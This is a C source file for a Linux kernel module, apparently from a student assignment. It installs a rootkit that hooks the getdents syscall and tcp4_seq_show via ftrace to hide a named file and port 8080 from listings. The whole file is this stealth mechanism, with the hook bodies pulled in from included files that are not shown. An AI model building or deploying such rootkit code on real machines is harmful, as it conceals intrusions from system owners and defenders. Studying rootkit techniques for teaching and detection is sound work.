#define MODULE
#define LINUX
#define __KERNEL__

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/compiler.h>
#include <linux/types.h>
#include <linux/proc_fs.h>
#include <linux/ftrace.h>
#include <linux/socket.h>
#include <net/sock.h>
#include <linux/trace.h>
#include <linux/seq_file.h>
#include <linux/fdtable.h>
#include <linux/limits.h>

#include "ftrace_utils.h"
#include "syshook_utils.h"

#define HIDDEN_PORT 8080
#define HIDDEN_FILE_DIR "/home/student/projects/hw"
#define HIDDEN_FILE_NAME "myfile"

#include "hook_functions/tcp_seq_show.c"
#include "hook_functions/getdents.c"

typedef enum {
        FAILED_TO_SET_SYSTEM_HOOKS = -1,
        FAIEDL_TO_SET_FHOOK_HOOKS = -2,
} ErrorCode;


static struct ftrace_hook tcp_seq_show_fhook = {
    .hook_func = hook_tcp4_seq_show,
    .orig_func_pointer = (void**)&org_tcp4_seq_show,
};

static struct sys_hook sys_hooks[] = {
    {
        .orig_func_pointer = (void**)&original_getdents,
        .hook_func = sys_getdents_hook,
        .sys_entry = __NR_getdents,
    },
};

int init_module(void)
{
    int res = 0;

    res = set_sys_hooks(sys_hooks, ARRAY_SIZE(sys_hooks));
    if (res != 0){
        printk("failed to set system hooks");
        return FAILED_TO_SET_SYSTEM_HOOKS;
    }

    res = set_ftrace_hook("tcp4_seq_show", &tcp_seq_show_fhook);
    if (res != 0){
        printk("failed to set tcp hook");
        undo_sys_hooks(sys_hooks, ARRAY_SIZE(sys_hooks));
        return FAILED_TO_SET_SYSTEM_HOOKS;
    }
    return 0;
}

void cleanup_module(void) 
{
    undo_sys_hooks(sys_hooks, ARRAY_SIZE(sys_hooks));
    undo_ftrace_hook(&tcp_seq_show_fhook);
}

MODULE_LICENSE("GPL");

